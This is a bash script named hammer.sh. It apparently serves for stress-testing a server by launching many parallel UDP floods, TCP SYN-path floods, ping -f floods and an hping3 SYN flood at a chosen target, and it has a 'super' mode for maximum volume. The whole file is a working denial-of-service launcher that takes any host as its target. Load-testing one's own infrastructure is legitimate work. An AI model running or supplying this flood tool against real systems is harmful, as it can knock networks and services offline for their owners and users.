#!/usr/bin/env bash
# hammer.sh - launch every stress vector at once (UDP + TCP + ICMP), each
# multi-process, against one target. Maximises load from this machine.
#
#   ./hammer.sh <target> [duration_s]
#   ./hammer.sh --super <target> [duration_s]   # SUPER HAMMER: oversend max data
#   sudo ./hammer.sh --super <target> [dur]      # + real ping -f flood
#
# SUPER HAMMER cranks every knob: 4x-CPU UDP workers, 4096-deep sendmmsg
# batches, near-MTU payloads and one extra giant-fragmented-datagram wave, plus
# more TCP SYN-path processes. It will saturate the source NIC/CPU; the target
# path (Wi-Fi/Twingate/a laptop) still caps what actually arrives - for real
# line-rate volume use pktgen on a wired Linux host on the target's LAN.
set -u
SUPER=0
if [ "${1:-}" = "--super" ]; then SUPER=1; shift; fi
TARGET="${1:?usage: hammer.sh [--super] <target> [duration_s]}"
DUR="${2:-15}"
HERE="$(cd "$(dirname "$0")" && pwd)"
FLOOD="$HERE/flood.py"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

n=0
launch(){ "$@" >"$TMP/out.$n" 2>&1 & n=$((n+1)); }

if [ "$SUPER" = 1 ]; then
  echo "=== SUPER HAMMER $TARGET for ${DUR}s : oversend maximum data ==="
  # Several full super-preset UDP swarms (each already 4x-CPU workers).
  for i in 1 2 3; do
    launch python3 "$FLOOD" super "$TARGET" -d "$DUR"
  done
  # One max-bandwidth wave of giant fragmented datagrams.
  launch python3 "$FLOOD" super "$TARGET" -d "$DUR" --size 65507
  # Heavy TCP SYN-path pressure.
  for i in 1 2 3 4 5 6; do
    launch python3 "$FLOOD" tcp-connect "$TARGET" --ports 80,443,22 -d "$DUR" -w 16
  done
else
echo "=== HAMMER $TARGET for ${DUR}s : UDP + TCP + ICMP, all in parallel ==="

# --- UDP floods on several ports (the heavy hitters) ---
for port in 80 443 8080 53 123; do
  launch python3 "$FLOOD" udp "$TARGET" -p "$port" -d "$DUR" -w 4
done
# --- TCP SYN-path floods (connect/close) ---
for i in 1 2 3; do
  launch python3 "$FLOOD" tcp-connect "$TARGET" -p 80 -d "$DUR" -w 8
done
fi
# --- ICMP: ping the shit out of it ---
if [ "$(id -u)" = 0 ]; then
  launch timeout "$DUR" ping -f "$TARGET"          # real flood ping (root)
  launch timeout "$DUR" ping -f "$TARGET"
else
  # non-root: parallel ping loops (macOS limits sub-second interval to root)
  for i in 1 2 3 4 5 6; do
    launch timeout "$DUR" sh -c "while :; do ping -c 300 '$TARGET' >/dev/null 2>&1; done"
  done
  echo "  (tip: run with 'sudo' for a real ping -f flood)"
fi
# --- hping3 SYN flood if available ---
if command -v hping3 >/dev/null 2>&1; then
  launch timeout "$DUR" sh -c "hping3 -S -p 80 -i u50 '$TARGET' >/dev/null 2>&1"
fi

echo "launched $n parallel attack processes; running ${DUR}s..."
wait

python3 - "$TMP" <<'PY'
import sys, glob, os, re
tot = rate = 0
mb = gbit = 0.0
def num(rx, t):
    m = re.search(rx, t); return float(m.group(1).replace(",", "")) if m else 0
for f in glob.glob(os.path.join(sys.argv[1], "out.*")):
    t = open(f, errors="ignore").read()
    tot  += int(num(r"sent\s*:\s*([\d,]+)", t))
    rate += int(num(r"rate\s*:\s*([\d,]+)", t))
    mb   += num(r"appdata\s*:\s*([\d,.]+)", t)
    gbit += num(r"throughput:\s*([\d,.]+)", t)
print(f"\nTOTAL sent by flood workers: {tot:,} packets  (~{rate:,} pps aggregate at source)")
print(f"TOTAL volume: {mb:,.0f} MB payload  (~{gbit:,.2f} Gbit/s aggregate on the wire)")
print("What actually reached the target is capped by the network path - check the server:")
PY
echo "  ssh vbff-root-1@$TARGET 'sudo xdp stats'"
